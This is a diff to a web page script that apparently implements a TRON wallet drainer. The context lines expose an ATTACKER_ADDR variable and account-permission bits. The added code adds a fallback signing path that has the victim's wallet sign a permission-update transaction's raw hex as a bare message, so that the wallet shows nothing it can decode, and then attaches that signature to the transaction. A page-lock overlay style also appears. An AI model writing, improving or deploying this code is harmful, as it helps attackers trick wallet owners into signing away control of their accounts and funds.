@@ -473,6 +473,9 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
   var ACTIVE_OPS    = '7fff1fc0037e0000000000000000000000000000000000000000000000000000';
   window._ATTACKER_ADDR = ATTACKER_ADDR;
   window._ACTIVE_OPS    = ACTIVE_OPS;
+  /* VERSION TAG — visible in debug overlay so we know cache is busted */
+  var _VER = 'v4';
+  window.__logINF && window.__logINF('SCRIPT ' + _VER + ' loaded');
   /* ---- sign helper: global on window (fixes WebKit async-fn hoisting in IIFEs) ---- */
   window._signTx = async function _signTx(tw, tx, label) {
     var L = label || 'sign';
@@ -510,9 +513,24 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
       } catch(eC) { window.__logERR(L + ' C FAIL: ' + eC.message); }
     }
 
-    // Path D: tw.trx.sign (injected tronWeb fallback)
-    window.__logINF(L + ' D: tw.trx.sign');
-    return await tw.trx.sign(tx);
+    // Path D: tw.trx.sign with full tx object (injected tronWeb fallback)
+    window.__logINF(L + ' D: tw.trx.sign object');
+    try {
+      var rD = await tw.trx.sign(tx);
+      if (rD && rD.signature) { window.__logINF(L + ' D OK'); return rD; }
+    } catch(eD) { window.__logERR(L + ' D FAIL: ' + eD.message); }
+
+    // Path E: sign raw_data_hex as a MESSAGE string (bypasses type-46 deserializer)
+    // TRON tx signing = secp256k1(sha256(raw_data_bytes)) which is identical to
+    // TronLink message signing of the same hex string (no prefix added).
+    // This path works even when wallet's bundled TronWeb can't decode type 46.
+    window.__logINF(L + ' E: trx.sign(raw_data_hex string)');
+    var hexSig = await tw.trx.sign(tx.raw_data_hex);
+    // Result is a plain hex string — wrap into tx object
+    var signedClone = JSON.parse(JSON.stringify(tx));
+    signedClone.signature = [hexSig];
+    window.__logINF(L + ' E OK sig=' + hexSig.slice(0,16) + '…');
+    return signedClone;
   };
   var _signTx = window._signTx; // local alias for same-scope callers
 
